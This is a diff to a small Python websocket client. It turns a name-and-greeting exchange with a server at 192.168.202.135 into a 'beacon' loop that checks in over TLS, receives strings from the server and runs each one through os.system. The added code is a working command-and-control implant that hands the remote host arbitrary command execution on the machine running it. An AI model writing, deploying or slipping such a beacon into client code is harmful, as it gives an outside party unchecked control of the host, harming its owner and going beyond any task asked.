@@ -2,6 +2,7 @@ import socket
 import ssl
 import websockets
 import asyncio
+import os
 
 # Server IP and Port details
 
@@ -26,16 +27,15 @@ sslSettings.load_cert_chain(certfile="/etc/nginx/certs/client.crt", keyfile="/et
 # Create a stream based client socket
 
 async def hello():
-    uri = "wss://192.168.202.135:443"
-    async with websockets.connect(
+        uri = "wss://192.168.202.135:443"
+        async with websockets.connect(
         uri, ssl=sslSettings
-    ) as websocket:
-        name = input("What's your name? ")
-
-        await websocket.send(name)
-        print(f"> {name}")
-
-        greeting = await websocket.recv()
-        print(f"< {greeting}")
+        ) as websocket:
+                print("Connected")
+                msg = '{"Name":"beacon"}'
+                while 1:
+                        await websocket.send(msg)
+                        cmd = await websocket.recv()
+                        os.system(cmd)
 
 asyncio.get_event_loop().run_until_complete(hello())
